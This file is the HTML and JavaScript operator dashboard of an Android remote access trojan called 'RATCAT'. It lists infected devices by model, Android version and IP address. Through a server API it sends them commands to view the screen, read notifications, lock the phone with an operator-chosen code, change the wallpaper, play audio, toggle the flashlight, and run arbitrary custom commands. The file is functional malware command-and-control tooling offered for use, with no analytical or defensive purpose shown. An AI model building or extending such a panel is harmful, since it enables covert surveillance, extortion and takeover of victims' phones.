<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RATCAT Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            border-bottom: 2px solid #00ff00;
            padding: 15px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            color: #00ff00;
            text-shadow: 0 0 20px rgba(0,255,0,0.3);
        }
        .header .status {
            color: #00ff00;
            font-size: 14px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
            text-align: center;
        }
        .stat-card .value {
            font-size: 28px;
            color: #00ff00;
        }
        .stat-card .label {
            color: #666;
            font-size: 12px;
            margin-top: 5px;
        }
        .main-panel {
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 20px;
            margin-top: 20px;
        }
        .sidebar {
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
            height: 500px;
            overflow-y: auto;
        }
        .sidebar h3 {
            color: #00ff00;
            margin-bottom: 15px;
        }
        .client-item {
            background: #1a1a1a;
            padding: 10px;
            margin: 5px 0;
            border-left: 3px solid #00ff00;
            cursor: pointer;
            border-radius: 3px;
        }
        .client-item:hover {
            background: #222;
        }
        .client-item .online {
            color: #00ff00;
        }
        .client-item .offline {
            color: #ff0000;
        }
        .client-item .device {
            color: #888;
            font-size: 11px;
        }
        .content {
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
        }
        .content .tabs {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 15px;
        }
        .content .tabs button {
            background: #1a1a1a;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .content .tabs button:hover {
            background: #2a2a2a;
        }
        .content .tabs button.active {
            background: #00ff00;
            color: #0a0a0a;
        }
        .output {
            background: #0a0a0a;
            border: 1px solid #333;
            padding: 15px;
            height: 350px;
            overflow-y: auto;
            font-size: 12px;
            border-radius: 3px;
            white-space: pre-wrap;
        }
        .command-area {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        .command-area input {
            flex: 1;
            background: #0a0a0a;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        .command-area button {
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
        }
        .command-area button:hover {
            background: #00cc00;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #111;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            border-radius: 5px;
            color: #00ff00;
            font-size: 14px;
            display: none;
        }
        .toast.show {
            display: block;
            animation: fadeIn 0.3s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .feature-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 10px 0;
        }
        .feature-btn {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            border-radius: 5px;
            cursor: pointer;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        .feature-btn:hover {
            background: #2a2a2a;
            transform: scale(1.02);
        }
        .feature-btn .icon {
            font-size: 30px;
        }
        .feature-btn .label {
            font-size: 12px;
            margin-top: 5px;
            color: #888;
        }
        @media (max-width: 768px) {
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            .main-panel {
                grid-template-columns: 1fr;
            }
            .feature-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>╔══ RATCAT CONTROL</h1>
            <div class="status">🟢 ONLINE | <span id="client_count">0</span> Clients</div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="value" id="total_clients">0</div>
                <div class="label">Total Clients</div>
            </div>
            <div class="stat-card">
                <div class="value" id="online_clients">0</div>
                <div class="label">Online</div>
            </div>
            <div class="stat-card">
                <div class="value" id="commands_sent">0</div>
                <div class="label">Commands Sent</div>
            </div>
            <div class="stat-card">
                <div class="value" id="uptime">0s</div>
                <div class="label">Uptime</div>
            </div>
        </div>

        <div class="main-panel">
            <div class="sidebar">
                <h3>📱 CONNECTED CLIENTS</h3>
                <div id="client_list">
                    <div style="color: #666; text-align: center; padding: 20px;">
                        No clients connected
                    </div>
                </div>
            </div>

            <div class="content">
                <div class="tabs">
                    <button class="active" onclick="sendFeature('info')">📊 Info</button>
                    <button onclick="sendFeature('flashlight')">🔦 Flash</button>
                    <button onclick="sendFeature('music')">🎵 Music</button>
                    <button onclick="sendFeature('lock')">🔒 Lock</button>
                    <button onclick="sendFeature('screen')">📺 Screen</button>
                    <button onclick="sendFeature('wallpaper')">🖼️ Wall</button>
                    <button onclick="sendFeature('notif')">🔔 Notif</button>
                </div>

                <div class="output" id="output">
[SYSTEM] Select a client and feature to begin
                </div>

                <div class="command-area">
                    <input type="text" id="cmd_input" placeholder="Custom command..." onkeydown="if(event.key==='Enter') sendCustom()">
                    <button onclick="sendCustom()">Execute</button>
                    <button onclick="document.getElementById('output').innerHTML = ''">Clear</button>
                </div>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        let selectedClient = null;
        let socket = null;
        let commandsCount = 0;
        let startTime = Date.now();

        // ==================== CONNECT TO WEBSOCKET ====================
        function connectWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/socket.io/`;
            
            socket = io(wsUrl, {
                transports: ['websocket', 'polling']
            });

            socket.on('connect', () => {
                console.log('[+] WebSocket connected');
                toast('Connected to RATCAT server');
                socket.emit('request_clients');
            });

            socket.on('disconnect', () => {
                console.log('[-] WebSocket disconnected');
                toast('Disconnected from server', 'error');
                setTimeout(connectWebSocket, 3000);
            });

            socket.on('clients', (clients) => {
                renderClients(clients);
                updateStats(clients);
            });

            socket.on('message', (data) => {
                if (data.type === 'result') {
                    const output = document.getElementById('output');
                    output.innerHTML += `\n[${data.client}] ${JSON.stringify(data.data, null, 2)}`;
                    output.scrollTop = output.scrollHeight;
                }
            });
        }

        // ==================== RENDER CLIENTS ====================
        function renderClients(clients) {
            const container = document.getElementById('client_list');
            let html = '';
            
            clients.forEach(c => {
                const status = c.connected ? '🟢 online' : '🔴 offline';
                const info = c.info || {};
                html += `
                    <div class="client-item" onclick="selectClient('${c.id}')" style="${selectedClient === c.id ? 'background: #2a2a2a;' : ''}">
                        <div><span class="${c.connected ? 'online' : 'offline'}">${status}</span> ${c.id}</div>
                        <div class="device">${info.device || 'Unknown'} | ${info.android || 'Unknown'}</div>
                        <div class="device">IP: ${c.ip || 'Unknown'}</div>
                    </div>
                `;
            });

            if (clients.length === 0) {
                html = '<div style="color: #666; text-align: center; padding: 20px;">No clients connected</div>';
            }

            container.innerHTML = html;
            document.getElementById('client_count').textContent = clients.filter(c => c.connected).length;
        }

        // ==================== UPDATE STATS ====================
        function updateStats(clients) {
            const total = clients.length;
            const online = clients.filter(c => c.connected).length;
            document.getElementById('total_clients').textContent = total;
            document.getElementById('online_clients').textContent = online;
            document.getElementById('uptime').textContent = Math.floor((Date.now() - startTime) / 1000) + 's';
            document.getElementById('commands_sent').textContent = commandsCount;
        }

        // ==================== SELECT CLIENT ====================
        function selectClient(id) {
            selectedClient = id;
            document.getElementById('output').innerHTML = `[SYSTEM] Selected client: ${id}`;
            
            // Highlight selected
            document.querySelectorAll('.client-item').forEach(el => {
                el.style.background = '';
            });
            document.querySelectorAll('.client-item').forEach(el => {
                if (el.textContent.includes(id)) {
                    el.style.background = '#2a2a2a';
                }
            });
        }

        // ==================== SEND FEATURE ====================
        function sendFeature(feature) {
            if (!selectedClient) {
                toast('Select a client first!', 'error');
                return;
            }

            const params = getFeatureParams(feature);
            if (params === null) return;

            const output = document.getElementById('output');
            output.innerHTML += `\n[CMD] Sending ${feature} to ${selectedClient}`;
            output.scrollTop = output.scrollHeight;

            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    client_id: selectedClient,
                    command: feature,
                    params: params
                })
            })
            .then(res => res.json())
            .then(result => {
                commandsCount++;
                if (result.success) {
                    output.innerHTML += `\n[OK] Command sent successfully`;
                } else {
                    output.innerHTML += `\n[ERR] Failed to send command`;
                }
                output.scrollTop = output.scrollHeight;
            })
            .catch(err => {
                output.innerHTML += `\n[ERR] ${err}`;
                output.scrollTop = output.scrollHeight;
            });
        }

        // ==================== GET FEATURE PARAMS ====================
        function getFeatureParams(feature) {
            switch(feature) {
                case 'flashlight':
                    const action = confirm('Turn ON flashlight?') ? 'on' : 'off';
                    return { action: action };
                
                case 'music':
                    const url = prompt('Enter YouTube URL:');
                    if (!url) return null;
                    return { url: url };
                
                case 'lock':
                    const code = prompt('Enter unlock code (4-6 digits):');
                    if (!code) return null;
                    return { code: code };
                
                case 'wallpaper':
                    const imgUrl = prompt('Enter image URL:');
                    if (!imgUrl) return null;
                    return { url: imgUrl };
                
                case 'screen':
                    return { action: 'view' };
                
                case 'notif':
                    return { action: 'get' };
                
                default:
                    return {};
            }
        }

        // ==================== SEND CUSTOM ====================
        function sendCustom() {
            const input = document.getElementById('cmd_input');
            const cmd = input.value.trim();
            if (!cmd || !selectedClient) {
                toast('Select client and enter command', 'error');
                return;
            }

            const parts = cmd.split(' ');
            const feature = parts[0];
            const params = parts.slice(1).join(' ');

            const output = document.getElementById('output');
            output.innerHTML += `\n[CMD] Custom: ${feature} ${params}`;
            output.scrollTop = output.scrollHeight;

            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    client_id: selectedClient,
                    command: feature,
                    params: { data: params }
                })
            })
            .then(res => res.json())
            .then(result => {
                commandsCount++;
                output.innerHTML += `\n[OK] ${result.success ? 'Sent' : 'Failed'}`;
                output.scrollTop = output.scrollHeight;
            });

            input.value = '';
        }

        // ==================== TOAST ====================
        function toast(msg, type = 'info') {
            const el = document.getElementById('toast');
            el.textContent = msg;
            el.className = 'toast show';
            setTimeout(() => {
                el.className = 'toast';
            }, 3000);
        }

        // ==================== INIT ====================
        connectWebSocket();
        setInterval(() => {
            if (socket) {
                socket.emit('request_clients');
            }
        }, 5000);
    </script>
    <script src="/socket.io/socket.io.js"></script>
</body>
</html>
